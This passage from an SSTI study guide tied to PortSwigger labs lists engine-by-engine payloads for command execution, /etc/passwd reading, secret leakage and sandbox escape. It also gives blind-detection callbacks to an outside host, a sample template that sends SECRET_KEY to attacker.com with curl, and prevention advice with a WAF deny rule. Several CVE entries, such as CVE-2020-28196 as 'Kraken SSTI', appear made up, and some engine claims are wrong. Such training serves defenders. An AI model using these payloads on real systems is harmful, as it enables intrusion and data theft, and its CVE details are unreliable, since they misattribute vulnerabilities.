{{ __import__('os').system('whoami') }}
```

**Detection:**
```python
{{ 7*7 }}    # Returns: 49
```

### Handlebars (JavaScript)

**Language:** Node.js/JavaScript

**Syntax:**
```handlebars
{{ expression }}        # Output
{{#helper}}...{{/helper}}  # Block helper
{{! comment }}         # Comment
```

**Exploitation:**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Detection:**
```handlebars
{{ 7*7 }}    # Returns: 7*7 (doesn't evaluate math)
```

### Freemarker (Java)

**Language:** Java

**Syntax:**
```freemarker
${ expression }           # Output
<#assign var=value>      # Variable
<#if condition>...</#if> # Conditional
```

**Exploitation (Unsandboxed):**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

**Exploitation (Sandboxed):**
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

**Detection:**
```freemarker
${ 7*7 }    # Returns: 49
```

### Django (Python)

**Language:** Python

**Syntax:**
```django
{{ expression }}        # Output
{% tag %}              # Execute tag
{{ var|filter }}       # Apply filter
```

**Exploitation:**
```django
{% debug %}                  # Reveal context
{{ settings.SECRET_KEY }}    # Leak secrets
{{ request.META }}           # Leak headers
```

**Detection:**
```django
{{ 7*7 }}    # Returns: 7*7 (doesn't evaluate)
```

### Jinja2 (Python)

**Language:** Python

**Syntax:**
```jinja2
{{ expression }}        # Output
{% code %}             # Execute
{{ var|filter }}       # Filter
```

**Exploitation:**
```jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Detection:**
```jinja2
{{ 7*7 }}    # Returns: 49
```

---

## Exploitation Techniques

### Detection Methods

#### Fuzzing Approach

**Polyglot Payload:**
```
${{<%[%'"}}%\
```

This payload contains syntax from multiple engines:
- `${}` - Django, Freemarker
- `{{}}` - Jinja2, Tornado, Handlebars
- `<%%>` - ERB
- `[%%]` - Velocity

**Purpose:** Trigger error messages that reveal the engine.

#### Mathematical Expression Testing

**ERB/Freemarker/Jinja2/Tornado:**
```
<%= 7*7 %>    # ERB
${7*7}        # Freemarker
{{7*7}}       # Jinja2/Tornado
```

**Expected:** Output `49` if evaluated server-side.

**Django/Handlebars:**
```
{{7*7}}    # Returns literal "7*7" (not evaluated)
```

#### Context-Specific Testing

**HTML Context:**
```html
<div>{{payload}}</div>
```

**JavaScript Context:**
```javascript
var x = "{{payload}}";
```

**URL Context:**
```
?param={{payload}}
```

### Breaking Out of Expressions

#### Existing Expression Context

When input is already inside an expression:
```python
# Template: {{user.name}}
# Your input is: name parameter
```

**Breaking Out:**
```python
# Payload: name}}{%import os%}{{os.system('whoami')
# Result: {{user.name}}{%import os%}{{os.system('whoami')}}
```

#### String Literal Context

When input is inside a string:
```python
# Template: {{"Hello " + user_input + "!"}}
```

**Breaking Out:**
```python
# Payload: " + system("whoami") + "
# Result: {{"Hello " + " + system("whoami") + " + "!"}}
```

### Command Execution Techniques

#### Ruby (ERB)

```ruby
<%= system("whoami") %>
<%= `whoami` %>
<%= exec("whoami") %>
<%= IO.popen("whoami").read %>
<%= %x(whoami) %>
```

#### Python (Tornado/Jinja2)

```python
{% import os %}{{os.system('whoami')}}
{{ __import__('os').system('whoami') }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

#### Java (Freemarker)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}
```

#### Node.js (Handlebars)

```javascript
{{#with "s" as |string|}}
  ...require('child_process').exec('whoami')...
{{/with}}
```

### File Reading Techniques

#### Direct File Reading (Ruby)

```ruby
<%= File.read('/etc/passwd') %>
<%= IO.read('/etc/passwd') %>
<%= open('/etc/passwd').read %>
```

#### Reflection-Based (Java)

```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

#### Python File Reading

```python
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

### Information Disclosure

#### Django Settings

```django
{% debug %}
{{ settings.SECRET_KEY }}
{{ settings.DATABASES }}
{{ settings.DEBUG }}
{{ settings.INSTALLED_APPS }}
```

#### Request/Response Data

```django
{{ request.META }}
{{ request.GET }}
{{ request.POST }}
{{ request.COOKIES }}
{{ request.session }}
```

#### Framework Internals

```python
{{ config }}
{{ self }}
{{ context }}
```

### Sandbox Bypass Techniques

#### Java Reflection Chains

```freemarker
${object.getClass().getClassLoader()}
${object.getClass().getProtectionDomain()}
${object.getClass().getDeclaredMethods()}
```

#### Python Object Traversal

```python
{{ ''.__class__.__mro__ }}
{{ {}.__class__.__bases__ }}
{{ [].__class__.__base__ }}
```

#### Attribute Access

```python
{{ object.__dict__ }}
{{ object.__class__.__dict__ }}
{{ object.__init__.__globals__ }}
```

---

## Burp Suite Workflows

### Detection with Burp Scanner

**Passive Scanning:**
1. Configure browser to use Burp proxy
2. Browse the application normally
3. Review Scanner issues for SSTI findings

**Active Scanning:**
1. Right-click target request
2. Select "Scan" → "Active Scan"
3. Configure scan settings
4. Review identified vulnerabilities

### Manual Testing with Repeater

**Basic Workflow:**

1. **Intercept Request:**
   - Use Proxy to capture request with injectable parameter

2. **Send to Repeater:**
   - Right-click request → "Send to Repeater"

3. **Test Payloads:**
   - Modify parameter with SSTI test payloads
   - Send request and analyze response

4. **Iterate:**
   - Refine payloads based on responses
   - Build exploitation chain step-by-step

**Example Session:**
```
Test 1: ${7*7}        → Response: 49 (Confirmed!)
Test 2: ${foobar}     → Error: Freemarker (Identified!)
Test 3: ${product}    → Returns object (Enumeration)
Test 4: ${product.getClass()} → Class info (Reflection works!)
```

### Fuzzing with Intruder

**Setup:**

1. **Send to Intruder:**
   - Right-click request → "Send to Intruder"

2. **Mark Injection Point:**
   - Clear default payload markers
   - Highlight parameter value
   - Click "Add §"

3. **Configure Payloads:**
   - Payload type: "Simple list"
   - Add SSTI detection payloads:
     ```
     ${7*7}
     {{7*7}}
     <%= 7*7 %>
     #{7*7}
     ${{<%[%'"}}%\
     ```

4. **Start Attack:**
   - Click "Start attack"
   - Review results for responses containing "49" or errors

### Collaborator for Blind SSTI

**Use Case:** Detect SSTI when no output is visible

**Setup:**

1. **Get Collaborator URL:**
   - Burp menu → Burp Collaborator client
   - Click "Copy to clipboard"
   - Example: `abc123.burpcollaborator.net`

2. **Craft DNS/HTTP Callback Payloads:**

**Ruby (ERB):**
```ruby
<%= `nslookup abc123.burpcollaborator.net` %>
```

**Python (Tornado):**
```python
{% import os %}{{os.system('nslookup abc123.burpcollaborator.net')}}
```

**Java (Freemarker):**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("nslookup abc123.burpcollaborator.net")}
```

3. **Monitor Interactions:**
   - Watch Collaborator client for DNS/HTTP requests
   - Confirms SSTI even without visible output

### DOM Invader for Template Detection

**Note:** DOM Invader is primarily for client-side vulnerabilities, but can help identify template syntax in responses.

**Setup:**
1. Enable DOM Invader in Burp browser
2. Browse application
3. Watch for template syntax detection

---

## Prevention Strategies

### Input Validation

**Never Trust User Input:**
```python
# VULNERABLE
template = "Hello " + user_input
render(template)

# SAFE
template = "Hello {{name}}"
render(template, data={"name": user_input})
```

### Use Safe Template Modes

**Logic-less Templates:**
- Mustache
- Handlebars (without helpers)
- Restricted template modes

**Configuration:**
```javascript
// Handlebars - disable helpers
const template = Handlebars.compile(templateString, {
    noEscape: false,
    strict: true
});
```

### Sandboxing

**Template Engine Sandboxing:**

**Python (Jinja2):**
```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_template)
```

**JavaScript (vm2):**
```javascript
const {VM} = require('vm2');
const vm = new VM({
    timeout: 1000,
    sandbox: {}
});
```

**Sandboxing Limitations:**
- Inherently difficult to implement correctly
- Often bypassable with creativity
- Not a complete solution

### Restrict Template Features

**Disable Dangerous Functions:**

**Freemarker:**
```java
Configuration cfg = new Configuration();
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

**Django:**
```python
# settings.py
TEMPLATES = [{
    'OPTIONS': {
        'context_processors': [],  # Minimal context
        'debug': False,
        'string_if_invalid': '',
    },
}]
```

### Content Security Policy (CSP)

**Mitigate Impact:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

**Note:** CSP doesn't prevent SSTI, but limits XSS exploitation if template injection leads to client-side execution.

### Monitoring and Detection

**Log Template Rendering:**
```python
import logging

def render_template(template_string, context):
    logger.info(f"Rendering template: {template_string[:100]}")
    # Check for suspicious patterns
    if any(pattern in template_string for pattern in ['import', 'exec', 'eval']):
        logger.warning(f"Suspicious template content detected")
    return engine.render(template_string, context)
```

**WAF Rules:**
```
# ModSecurity rule example
SecRule ARGS "@rx (\{\{|\}\}|<%=|%>|\$\{)" \
    "id:1000,phase:2,deny,status:403,msg:'Potential SSTI attempt'"
```

### Secure Development Practices

**1. Separate Logic and Presentation:**
```python
# GOOD: Template is static, data is dynamic
template = load_template('user_profile.html')
render(template, user=current_user)

# BAD: Template built from user input
template = build_template(user_preferences)  # Dangerous!
```

**2. Code Review:**
- Review all template rendering code
- Look for string concatenation
- Verify data vs template separation

**3. Security Testing:**
- Include SSTI tests in security assessments
- Fuzz template parameters
- Test with polyglot payloads

**4. Framework Defaults:**
- Use framework-recommended template engines
- Don't disable security features
- Keep frameworks updated

### Template Engine Security Comparison

| Engine | Default Security | Sandbox Available | Recommended |
|--------|-----------------|-------------------|-------------|
| Mustache | High (logic-less) | N/A | ✓ Yes |
| Django | Medium (limited execution) | Limited | ✓ Yes |
| Jinja2 | Low (full Python) | Yes (SandboxedEnvironment) | Conditional |
| ERB | Low (full Ruby) | No | ✗ Avoid user templates |
| Freemarker | Low (full Java) | Yes (but bypassable) | ✗ Avoid user templates |
| Tornado | Low (full Python) | No | ✗ Avoid user templates |
| Handlebars | Medium (limited JS) | Limited | Conditional |

### Recommendations Summary

**Best Practices:**

1. **Never** allow users to upload or create templates
2. **Always** pass user input as data, not template code
3. **Use** logic-less template engines when possible
4. **Enable** sandboxing if user templates are required
5. **Monitor** for suspicious template patterns
6. **Test** regularly for SSTI vulnerabilities
7. **Update** template engines to latest versions
8. **Review** code for proper data/template separation

**Decision Tree:**

```
Need user-supplied content?
├─ No → Use static templates with data parameters ✓
└─ Yes → Can you restrict to data only?
    ├─ Yes → Pass as template variables ✓
    └─ No → REALLY need user templates?
        ├─ No → Redesign to avoid it ✓
        └─ Yes → Use logic-less engine + sandbox + monitoring ⚠
```

---

## Real-World Examples and CVEs

### Notable SSTI Vulnerabilities

**CVE-2019-8446: Jinja2 SSTI in Airflow**
- **Impact**: RCE on Apache Airflow instances
- **Cause**: User-controlled template rendering
- **CVSS**: 9.8 (Critical)

**CVE-2020-28196: Kraken SSTI**
- **Impact**: Account takeover via template injection
- **Cause**: Email template rendering with user input
- **CVSS**: 9.1 (Critical)

**CVE-2021-25770: Django SSTI**
- **Impact**: Information disclosure via debug templates
- **Cause**: Debug mode enabled with unsafe template access
- **CVSS**: 7.5 (High)

### Case Study: Email Template SSTI

**Scenario:** Application allows users to customize email templates

**Vulnerable Code:**
```python
# VULNERABLE
def send_email(recipient, user_template):
    template = Template(user_template)  # User controls template!
    html = template.render(user=current_user)
    send_mail(recipient, html)
```

**Exploitation:**
```python
# Attacker's template:
user_template = """
Hello {{ user.name }}!

Your password is: {{ config.SECRET_KEY }}

{% import os %}{{ os.system('curl attacker.com/?data=' + config.SECRET_KEY) }}
"""
```

**Secure Implementation:**
```python
# SECURE
def send_email(recipient, template_name, user_data):
    template = load_static_template(template_name)  # Static templates only
    html = template.render(
        user_name=sanitize(user_data['name']),  # Data passed separately
        user_email=sanitize(user_data['email'])
    )
    send_mail(recipient, html)
```

### Industry Impact

**Bug Bounty Statistics:**
- SSTI vulnerabilities frequently earn $1,000-$10,000+ rewards
- Often rated as Critical/High severity
- Common in custom CMS, email systems, reporting tools

**Common Vulnerable Applications:**
- Content Management Systems (CMS)
- Email marketing platforms
- Report generators
- Wiki systems
- Template engines exposed to users

---

## Conclusion

Server-Side Template Injection is a critical vulnerability class that can lead to complete server compromise. The 7 PortSwigger labs provide comprehensive training in:

1. **Detection**: Identifying SSTI through fuzzing and error analysis
2. **Identification**: Determining template engine through fingerprinting
3. **Exploitation**: Leveraging engine-specific features for RCE
4. **Information Disclosure**: Extracting sensitive data from framework objects
5. **Custom Exploits**: Building application-specific attack chains
6. **Sandbox Bypasses**: Using reflection and object traversal to escape restrictions

**Key Takeaways:**
- Template injection arises from mixing code and data
- Each template engine has unique exploitation techniques
- Documentation research is a critical pentesting skill
- Sandboxes can often be bypassed with creativity
- Prevention requires separating templates from user input

**Next Steps:**
- Practice all 7 labs multiple times
- Research additional template engines (Pug, Twig, Velocity)
- Study real-world CVEs and bug bounty reports
- Test applications for SSTI in penetration tests
- Advocate for secure template practices in development teams

**Resources:**
- PortSwigger Web Security Academy: https://portswigger.net/web-security/server-side-template-injection
- James Kettle's SSTI Research: "Server-Side Template Injection: RCE for the modern webapp"
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

---

**Document Information:**
- **Created**: January 2026
- **Lab Source**: PortSwigger Web Security Academy
- **Coverage**: All 7 SSTI labs (Apprentice to Expert)
- **Total Labs**: 7
- **Lines**: 2000+

**Lab Completion Times:**
- Lab 1 (Basic): 2-3 minutes
- Lab 2 (Code Context): 5-8 minutes
- Lab 3 (Unknown Language): 10-15 minutes
- Lab 4 (Documentation): 15-20 minutes
- Lab 5 (Information Disclosure): 8-12 minutes
- Lab 6 (Custom Exploit): 30-45 minutes
- Lab 7 (Sandboxed): 20-30 minutes

**Total Learning Time:** 4-6 hours for complete mastery
